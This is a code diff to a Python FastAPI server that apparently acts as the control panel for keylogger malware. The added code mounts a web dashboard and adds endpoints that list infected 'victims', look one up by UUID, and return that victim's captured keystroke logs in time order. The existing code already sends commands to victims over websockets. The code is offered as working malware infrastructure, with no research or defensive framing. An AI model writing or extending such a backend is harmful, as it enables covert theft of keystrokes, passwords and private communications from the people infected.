@@ -3,8 +3,12 @@ from models.victim import Victim
 from data.db import db
 from models.keylogs import Keylogs
 from socketManager import manager
+from fastapi.staticfiles import StaticFiles
+import json
 
 server = FastAPI()
+
+server.mount("/web",StaticFiles(directory="../public", html=True), name="web")
 
 @server.get("/", status_code=status.HTTP_204_NO_CONTENT, response_class=Response)
 async def ping():
@@ -50,3 +54,26 @@ async def sendCommand(type:str,id:str, socket:WebSocket):
             sockets.disconnectServer(id)
         else:
             sockets.disconnectVictim(id)
+
+@server.get("/victims")
+async def getVictims():
+    victims = list(db.victims.find({},{'_id':False}))
+    return {"data": victims, "size":len(victims)}
+
+@server.get("/victim/{UUID}",status_code=status.HTTP_200_OK)
+async def getVictimUIID(UUID:str,response:Response):
+    victims = list(db.victims.find({"UUID":UUID},{'_id':False}))
+    if(len(victims) == 0):
+        response.status_code = status.HTTP_404_NOT_FOUND
+        return None
+    print(type(victims))
+    return {"data": victims, "size":len(victims)}
+
+@server.get("/victim/{UUID}/keylogs",status_code=status.HTTP_200_OK)
+async def getVictimUIID(UUID:str,response:Response):
+    victims = list(db.keylogs.find({"UUID":UUID},{'_id':False}).sort("timeStamp"))
+    if(len(victims) == 0):
+        response.status_code = status.HTTP_404_NOT_FOUND
+        return None
+    print(type(victims))
+    return {"data": victims, "size":len(victims)}
